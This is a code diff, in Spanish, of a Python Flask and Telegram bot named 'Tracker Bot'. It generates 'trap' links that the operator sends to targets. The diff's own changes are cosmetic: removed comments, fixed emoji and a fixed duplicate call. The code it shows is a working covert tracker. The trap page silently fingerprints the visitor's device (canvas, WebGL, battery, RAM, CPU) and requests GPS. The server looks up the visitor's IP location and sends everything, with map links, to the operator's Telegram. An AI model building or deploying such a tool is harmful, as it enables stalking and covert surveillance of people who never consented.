@@ -79,7 +79,6 @@ def obtener_info_ip(ip):
             print(f"Error con {url}: {e}")
             continue
     
-    # Si todo falla, retorna datos básicos
     return {'ip': ip, 'pais': 'Desconocido', 'ciudad': 'Desconocida'}
 
 def enviar_telegram(mensaje, parse_mode="HTML"):
@@ -102,7 +101,7 @@ def comando_generar(message):
     
     texto = f"🎯 <b>Link Generado</b>\n\n"
     texto += f"🔗 <code>{url_trampa}</code>\n\n"
-    texto += f" Recopilará: Ubicación, Dispositivo, IP\n"
+    texto += f"📊 Recopilará: Ubicación, Dispositivo, IP\n"
     texto += f"⚠️ <i>Envía este link para rastrear.</i>"
     
     bot.reply_to(message, texto, parse_mode="HTML")
@@ -128,64 +127,55 @@ def recibir_datos(id_link):
     datos = request.json
     ip = request.headers.get('X-Forwarded-For', request.remote_addr)
     
-    # Obtener info de la IP
     info_ip = obtener_info_ip(ip.split(',')[0].strip())
     
-    # Construir mensaje
     msg = f"🚨 <b>¡NUEVO VISITANTE!</b>\n\n"
     
-    # Ubicación
     msg += f"📍 <b>UBICACIÓN:</b>\n"
     msg += f"🌐 <b>IP:</b> <code>{info_ip.get('ip', 'N/A')}</code>\n"
     msg += f"🌎 <b>País:</b> {info_ip.get('pais', 'N/A')}\n"
     msg += f"🏙️ <b>Ciudad:</b> {info_ip.get('ciudad', 'N/A')}\n"
     msg += f"📮 <b>Región:</b> {info_ip.get('region', 'N/A')}\n"
-    msg += f" <b>ISP:</b> {info_ip.get('isp', 'N/A')}\n"
+    msg += f"🌐 <b>ISP:</b> {info_ip.get('isp', 'N/A')}\n"
     msg += f"🕐 <b>Zona:</b> {info_ip.get('timezone', 'N/A')}\n"
     
     if info_ip.get('latitud') and info_ip.get('longitud'):
         msg += f"📍 <b>Coords:</b> {info_ip.get('latitud')}, {info_ip.get('longitud')}\n"
         msg += f"<a href='https://www.google.com/maps?q={info_ip.get('latitud')},{info_ip.get('longitud')}'>🗺️ Ver en Maps</a>\n"
     
-    # GPS preciso si está disponible
     if datos.get('gps_lat'):
         msg += f"\n🎯 <b>GPS Preciso:</b>\n"
         msg += f"📍 {datos.get('gps_lat')}, {datos.get('gps_lon')}\n"
         msg += f"📏 <b>Precisión:</b> {datos.get('gps_accuracy', 'N/A')}m\n"
         msg += f"<a href='https://www.google.com/maps?q={datos.get('gps_lat')},{datos.get('gps_lon')}'>📍 Mapa GPS</a>\n"
     
-    # Dispositivo
     msg += f"\n💻 <b>DISPOSITIVO:</b>\n"
     msg += f"📱 <b>Tipo:</b> {datos.get('device_type', 'N/A')}\n"
     msg += f"🖥️ <b>SO:</b> {datos.get('os', 'N/A')}\n"
     msg += f"🌐 <b>Navegador:</b> {datos.get('browser', 'N/A')}\n"
     msg += f"📐 <b>Pantalla:</b> {datos.get('screen', 'N/A')}\n"
     
-    # Hardware básico
     msg += f"\n🔧 <b>HARDWARE:</b>\n"
     msg += f"💾 <b>RAM:</b> {datos.get('ram', 'N/A')}\n"
     msg += f"💻 <b>CPU:</b> {datos.get('cpu_cores', 'N/A')} cores\n"
     msg += f"🔋 <b>Batería:</b> {datos.get('bateria', 'N/A')}%\n"
     
-    # Conexión
     msg += f"\n📡 <b>CONEXIÓN:</b>\n"
     msg += f"🌐 <b>Tipo:</b> {datos.get('connection_type', 'N/A')}\n"
     msg += f"🌍 <b>Idioma:</b> {datos.get('language', 'N/A')}\n"
     msg += f"⏰ <b>Zona Horaria:</b> {datos.get('timezone', 'N/A')}\n"
     
-    # Fingerprint básico
     msg += f"\n🔐 <b>FINGERPRINT:</b>\n"
     msg += f"🎨 <b>Canvas:</b> <code>{datos.get('canvas', 'N/A')}</code>\n"
     msg += f"🎮 <b>WebGL:</b> {datos.get('webgl_vendor', 'N/A')}\n"
     
-    # Estadísticas
     msg += f"\n📊 <b>Visitas:</b> {links_activos[id_link]['visitas']}\n"
     msg += f"🕐 <b>Hora:</b> {time.strftime('%H:%M:%S')}\n"
     
     enviar_telegram(msg)
     return jsonify({"status": "ok"}), 200
 
-# ================= HTML TRAMPA SIMPLIFICADO =================
+# ================= HTML TRAMPA =================
 HTML_TRAMPA = """
 <!DOCTYPE html>
 <html>
@@ -221,7 +211,6 @@ async function capturar(){
     platform: navigator.platform
   };
   
-  // Detectar SO
   const ua = navigator.userAgent;
   if (ua.includes('Android')) { datos.os = 'Android'; datos.device_type = 'Móvil'; }
   else if (ua.includes('iPhone')) { datos.os = 'iOS'; datos.device_type = 'Móvil'; }
@@ -230,17 +219,14 @@ async function capturar(){
   else if (ua.includes('Linux')) { datos.os = 'Linux'; datos.device_type = 'PC'; }
   else { datos.os = 'Desconocido'; datos.device_type = 'Desconocido'; }
   
-  // Detectar navegador
   if (ua.includes('Chrome') && !ua.includes('Edg')) { datos.browser = 'Chrome'; }
   else if (ua.includes('Firefox')) { datos.browser = 'Firefox'; }
   else if (ua.includes('Safari') && !ua.includes('Chrome')) { datos.browser = 'Safari'; }
   else if (ua.includes('Edg')) { datos.browser = 'Edge'; }
   else { datos.browser = 'Desconocido'; }
   
-  // Hardware básico
   datos.cpu_cores = navigator.hardwareConcurrency || 'N/A';
   
-  // Batería
   if ('getBattery' in navigator) {
     try {
       const battery = await navigator.getBattery();
@@ -248,17 +234,14 @@ async function capturar(){
     } catch(e) { datos.bateria = 'N/A'; }
   } else { datos.bateria = 'N/A'; }
   
-  // RAM
   if (navigator.deviceMemory) {
     datos.ram = navigator.deviceMemory + ' GB';
   } else { datos.ram = 'N/A'; }
   
-  // Conexión
   if ('connection' in navigator) {
     datos.connection_type = navigator.connection.effectiveType || 'N/A';
   } else { datos.connection_type = 'N/A'; }
   
-  // Canvas fingerprint
   try {
     const canvas = document.createElement('canvas');
     const ctx = canvas.getContext('2d');
@@ -268,7 +251,6 @@ async function capturar(){
     datos.canvas = canvas.toDataURL().substring(0, 50);
   } catch(e) { datos.canvas = 'N/A'; }
   
-  // WebGL
   try {
     const canvas = document.createElement('canvas');
     const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
@@ -284,7 +266,6 @@ async function capturar(){
     }
   } catch(e) { datos.webgl_vendor = 'N/A'; }
   
-  // GPS
   if ('geolocation' in navigator) {
     navigator.geolocation.getCurrentPosition(
       (pos) => {
@@ -318,7 +299,7 @@ capturar();
 </html>
 """
 
-# ================= INICIO =================
+# ================= FUNCIONES DE INICIO =================
 def iniciar_bot():
     print("🤖 Bot iniciado...")
     bot.infinity_polling()
@@ -331,4 +312,4 @@ if __name__ == '__main__':
     print("✨ Iniciando Tracker Bot...")
     print(f"📍 Base URL: {BASE_URL}")
     threading.Thread(target=iniciar_flask, daemon=True).start()
-    iniciar_bot()iniciar_bot()
+    iniciar_bot()
